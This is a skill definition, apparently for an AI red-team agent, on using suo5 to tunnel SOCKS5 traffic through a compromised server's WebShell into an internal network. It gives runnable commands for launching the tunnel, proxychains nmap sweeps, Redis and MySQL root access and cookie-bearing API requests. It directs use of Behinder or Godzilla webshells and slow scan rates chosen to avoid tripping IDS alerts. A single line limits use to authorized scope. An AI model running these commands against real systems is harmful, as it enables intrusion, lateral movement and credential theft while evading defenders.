---
name: suo5-tunnel
description: 【Tunnel】Use suo5 to establish a SOCKS5 tunnel through a WebShell/HTTP endpoint and proxy internal network traffic out (core internal-pivot tool)
whenToUse: A machine has already been compromised (WebShell/RCE) and you need to enter the internal network for scanning and lateral movement
role: internal
category: Tunnel
tags: [tunnel, webshell, socks5]
enabled: true
---

# suo5 Internal Tunnel

> **This is the only standard channel into the internal network** — after obtaining a WebShell/RCE you **must** first build a
> socks5 tunnel with suo5, register the tunnel in the database (`redteam_tunnel_add` kind=suo5), and verify with
> `redteam_session_check` that it really works, before any internal mapping or lateral movement.
> **Without a tunnel, do not hand-roll internal discovery scripts** — hand-rolled scripts are slow and easily kill the foothold.
> The WebShell at the tunnel entry must be a Behinder shell or a Godzilla shell (see the `webshell-toolkit` skill), otherwise the user cannot reuse it.

Binary: `$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64` (v2.2.0, static Go, no dependencies)

## Establishing the tunnel
```bash
SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64

# 1) Use the WebShell as the tunnel endpoint (HTTP type)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) When authentication is required
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) HTTP proxy only (some tools only support an http proxy)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
Parameter quick reference: `-t` target shell URL, `-l` local listener, `-m socks5|http`, `--auth user:pass`, `-r` reconnect interval, `--debug` to inspect traffic.

## Internal operations through the tunnel
```bash
# curl through socks5
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# nmap must use -sT (full connect) + proxychains, or --proxies directly (newer versions)
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# Databases / middleware
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# Browser/API testing through the tunnel
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## Internal scanning cadence (avoid alerts)
- First do `/24` liveness discovery (`nmap -sn` through the tunnel or ICMP), then scan common ports on live hosts.
- Drop the rate to `-T2 --max-rate 50` to avoid tripping IDS.
- Register every newly discovered asset with `redteam_asset_add` (it automatically creates the C-segment per /24), marking `provenance="active"` and `tool="suo5+nmap"`.

## Persisting to the database
- **Register immediately after building (mandatory)** — `redteam_tunnel_add` (`kind=suo5`, `listen=127.0.0.1:1080`, `entry=<WebShell URL>`, `reach=reachable segments`, `command=full startup command`), with `webshell_id` pointing at the corresponding WebShell record; then run `redteam_session_check` to actually test connectivity and confirm status=active before continuing.
- Register tunnels with `redteam_tunnel_add` (spell out `command`/`entry_kind`); no separate chain entry is needed.
- Record each internal asset, each successful login, and each credential separately (asset/access/credential).
- When a tunnel dies, mark it down with `redteam_tunnel_update`; do not leave behind a tunnel that "looks running but does not pass traffic" for later roles to step into.

## Notes
- Clean up the tunnel endpoint file when done, restoring the target to its original state.
- Free public proxies are not suitable for carrying tunnels; suo5 runs through the target's own WebShell and needs no extra proxy.
- Use only within the authorized scope.
